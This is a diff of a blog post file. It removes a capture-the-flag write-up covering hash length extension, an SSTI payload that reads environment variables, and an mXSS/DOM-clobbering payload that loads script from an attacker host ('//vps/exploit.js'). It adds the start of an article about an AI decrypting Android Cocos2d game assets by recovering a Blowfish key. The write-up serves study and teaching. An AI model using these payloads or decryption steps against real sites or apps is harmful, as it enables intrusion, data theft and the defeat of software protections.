@@ -1,189 +1,36 @@
-When generating the cookie, a signature (`sha256(secret + user_string)`) is added to verify the data integrity.
+This article documents what AI can achieve and concludes with how this experience has changed my perspective on AI.
 
-Therefore, in the absence of knowledge of the key, we should not be able to forge the `user_string` because the integrity check will fail.
+<!-- more -->
 
-However, this challenge uses a verification method that can be attacked using a technique called length extension attack.
+## Selected Cases
 
-Simply put, if there is an operation: `M1 = hash(secret + data)`, you only need to know the "length" of `secret+data`, without knowing what the content is, and the resulting `M1`. Then, you can append any string after `secret+data`, and know the valid `hash(secret + data + padding + any data)`.
+The following cases are all Android applications unless otherwise specified.
 
-For example, if you know that `"{secret}username=a"` will become `781e5e245d69b566979b86e28d23f2c7` after being hashed by md5, even if you do not know the secret, you can still know the md5 of `"{secret}username=a{padding},username=admin"`.
+### Case 1: Cocos2d Game
 
-The `{padding}` above is related to the principle of hash algorithm.
+After AI unpacked the APK, it used jadx to decompile the Java and found that the game logic was not included.
 
-In short, through this attack method, we can extend the known string and generate a valid hash value without knowing the secret, and bypass the check of this challenge.
+Upon observation, it was discovered that the game was written in Cocos2d, with a large number of encrypted JavaScript and JSON files under the assets directory, as well as a `libcocos2djs.so`.
 
-As for the detailed principles and attack methods, I will leave a few reference articles here, and I may come back to fill this gap in the future:
+The next step was to parse the symbols within `libcocos2djs.so`, where some encryption and decryption functions were indeed found. However, since this SO file was 35 MB, AI deemed it too large and chose to reverse engineer from the decryption functions instead, identifying that the encryption algorithm was Blowfish.
 
-2. [Length Extension Attack (LEA)](https://maojui.me/Crypto/LEA/)
-3. [Hash Length Extension Attacks](https://www.whitehatsec.com/blog/hash-length-extension-attacks/)
-4. [Understanding the length extension attack](https://crypto.stackexchange.com/questions/3978/understanding-the-length-extension-attack)
-6. [Hash Length Extension Attacks](https://xz.aliyun.com/t/2563)
-7. [Length extension attack](https://ucgjhe.github.io/post/length_extension_attack/)
+Next, I traced who called the function that set the key, and after decompiling that segment, I restored the key, which was constructed in the original code by concatenating strings one by one:
 
-## Dumb Forum
-
-There is an SSTI in this question:
-
-``` py
-@app.route('/profile', methods=['GET', 'POST'])
-@login_required
-def profile():
-    with open('app/templates/profile.html') as p:
-        profile_html = p.read()
-    
-    profile_html = profile_html % (current_user.username, current_user.email, current_user.about_me)
-
-    if(current_user.about_me == None):
-        current_user.about_me = ""
-    return render_template_string(profile_html)
+``` c
+std::string key;
+key.push_back('7');  // MOV W8, 0x37
+key.push_back('2');  // MOV W8, 0x32
+key.push_back('c');  // MOV W8, 0x63
+key.push_back('d');  // MOV W8, 0x64
+....（32 in total）
 ```
 
-Both the username and aboutme are checked and cannot use `}{`, while email is only checked if it is a valid email address, and if so, it can be used.
+This is particularly noteworthy because before attempting this method, AI first scanned the code to see if there were any strings resembling the key, but found none. By this point, AI understood that since the key was added one by one, it was not continuous in the code and could not be directly scanned.
 
-Therefore, `abc｛{7*7}}@abc.com` will be displayed as `abc49@abc.com` on the interface because in this library, if an email address has `()` it will be considered invalid, so `()` cannot be used.
+Then, I wrote a Python script to decrypt all resources, ultimately obtaining the JavaScript and restoring the game logic and client-side configuration.
 
-The flag is in the environment variable, so just do this to win:
+This case primarily involved pure static analysis, where AI used static analysis alone to find the encryption and decryption functions as well as the key-setting location, then decompiled back to derive the key's content and decrypted the game resources.
 
-``` py
-{{cycler.__init__.__globals__.os.environ}}@x.com
-```
+### Case 2: Another Cocos2d Game
 
-## LESN
-
-In this question, you can create a post, the content of which can be controlled but will be sanitized, and finally rendered like this:
-
-``` ejs
-<script src="/static/script.js" async></script>
-
-<a style="position: absolute; left: 30%; top:5px" href="/">Home</a>
-<a style="position: absolute; right: 30%; top:5px" href="/edit/<%= imgid %>">Edit</a>
-
-<div style="margin-top: 3em;">
-    <img src="<%= imgurl %>" onerror="setTimeout(redirect_error_image,1500)"
-        style="max-height: 300px; max-width: 300px; display:block; margin: auto; border: 2px solid #555;">
-
-    <div style="margin-top: 30px; text-align: center;"><%- description %></div>
-</div>
-
-
-<%- include('footer') %>
-```
-
-The filtering code looks like this:
-
-``` js
-const createDOMPurify = require('dompurify');
-const { JSDOM } = require('jsdom');
-
-const window = new JSDOM('').window;
-const DOMPurify = createDOMPurify(window);
-
-function my_sanitize(html) {
-    const document = new JSDOM('').window.document
-    document.body.outerHTML = html
-
-    let node;
-    const iter = document.createNodeIterator(document.body)
-
-    while (node = iter.nextNode()) {
-        if (/(script|iframe|frame|object|data|m.+)/i.test(node.nodeName)) {
-            node.parentNode.removeChild(node)
-            continue
-        }
-
-
-        if (node.attributes) {
-            for (let i = node.attributes.length - 1; i >= 0; i--) {
-                const att = node.attributes[i]
-                if (! /(class|src|style)/i.test(att.name)) {
-                    node.removeAttributeNode(att)
-                }
-            }
-        }
-    }
-
-    return document.body.innerHTML
-}
-
-function sanitize(html) {
-
-    let clean = my_sanitize(html)
-
-    clean = DOMPurify.sanitize(clean)
-
-    return clean
-}
-
-
-module.exports = { sanitize }
-```
-
-Finally, it has been passed through DOMPurify, so dangerous tags cannot be used.
-
-The key point of this question is that when I was looking at it, I found that sometimes the console would display an error message of `redirect_error_image is undefined`.
-
-This is because the script is loaded using async, so there is a race condition problem. If the `onerror` of the img is triggered before the script is loaded, then `redirect_error_image` will be undefined.
-
-Using this feature, the winning formula is to use DOM clobbering to control `redirect_error_image`, and then use the `setTimeout` function to execute arbitrary code with the first parameter passed as a string, which is similar to the `eval` function.
-
-The part of DOM clobbering needs to bypass the custom parser first, which is completed by a teammate. The principle is roughly described in this article: [HTML sanitization bypass in Ruby Sanitize < 5.2.1](https://research.securitum.com/html-sanitization-bypass-in-ruby-sanitize-5-2-1/), using namespace confusion to create mXSS, and the payload looks like this:
-
-``` html
-<svg><style><&sol;style><&sol;svg>&lt;a id=redirect_error_image href=http:pew>g
-```
-
-jsdom will parse the above paragraph into this:
-
-```
-BODY
--> svg
----> style
-------> #text: </style></svg><a id=redirect_error_image href=http:pew>g
-```
-
-It is just a style with content, nothing special, but when restored to `document.body.innerHTML`, it becomes like this:
-
-``` html
-<svg><style></style></svg><a id=redirect_error_image href=http:pew>g</style></svg>
-```
-
-Then this `<a>` tag is generated, allowing us to perform DOM clobbering. The content can be simply put `http:import(script)`, where `http:` is treated as a label, and the following code will be executed directly.
-
-The next step is how to make `onerror` happen faster than the script is loaded. According to the author's [writeup](https://github.com/xatophi/m0leconteaser2022-LESN/blob/main/writeup.md), you can put a URL like `http://localhost` in the image URL to make it fail quickly, and `http://not_exist` should work too.
-
-Then you can use an iframe to load your post and then send the custom page to the bot to avoid using the cached `script.js`.
-
-At that time, I thought that the browser had priority when loading resources. If I could create a combination with a higher priority than `script.js`, I could delay the loading of the script. So I tried to add a lot of pictures to the page:
-
-``` html
-<svg><style><&sol;style><&sol;svg>&lt;a id=redirect_error_image href=mailto:import('//vps/exploit.js')>
-&lt;img src=https://deelay.me/20000/https://example.com>
-&lt;img src=https://deelay.me/20001/https://example.com>
-&lt;img src=https://deelay.me/20002/https://example.com>
-&lt;img src=https://deelay.me/20003/https://example.com>
-```
-
-But it seems to be useless, and the order of the pictures should not be higher than the script. At that time, I did not continue to study what could achieve the ideal situation I wanted.
-
-Finally, I thought of when @lbrnli1234 was solving an XSS question I gave before, he also encountered a race condition and then added a lot of iframes to increase the success rate. See: [Notes XSS Challenge Author Writeup](https://blog.huli.tw/2022/04/13/en/notes-challenge-author-writeup/)
-
-I did the same thing and stuffed a bunch of iframes:
-
-``` html
-<!DOCTYPE html>
-<html>
-<head>
-</head>
-<body>
-
-  <iframe src="https://lesn.m0lecon.fans/post/db4196ed-5b38-41eb-b6c4-d8f8ced9fe38"></iframe>
-  <iframe src="https://lesn.m0lecon.fans/post/db4196ed-5b38-41eb-b6c4-d8f8ced9fe38"></iframe>
-  <iframe src="https://lesn.m0lecon.fans/post/db4196ed-5b38-41eb-b6c4-d8f8ced9fe38"></iframe>
-  <iframe src="https://lesn.m0lecon.fans/post/db4196ed-5b38-41eb-b6c4-d8f8ced9fe38"></iframe>
-  <iframe src="https://lesn.m0lecon.fans/post/db4196ed-5b38-41eb-b6c4-d8f8ced9fe38"></iframe>
-  <iframe src="https://lesn.m0lecon.fans/post/db4196ed-5b38-41eb-b6c4-d8f8ced9fe38"></iframe>
-  <iframe src="https://lesn.m0lecon.fans/post/db4196ed-5b38-41eb-b6c4-d8f8ced9fe38"></iframe>
-  <iframe src="https://lesn.m0lecon.fans/post/db4196ed-5b38-41eb-b6c4-d8f8ced9fe38"></iframe>
-  <iframe src="https://lesn.m0lecon.fans/post/db4196ed-5b38-41eb-b6c4-d8f8ced9fe38"></iframe>
-  <iframe src="https://lesn.m0lecon.fans/post/db4196ed-5b38-41eb-b6c4-d8f8ced9fe38"></iframe>
-</body>
+Similarly, after unpacking and using jadx, it was found that the DEX had a shell added. However, this game was also observed to be Cocos2d, so the DEX was set aside for now, and AI first looked at `libcocos2djs.so`, where a suspicious key was found.
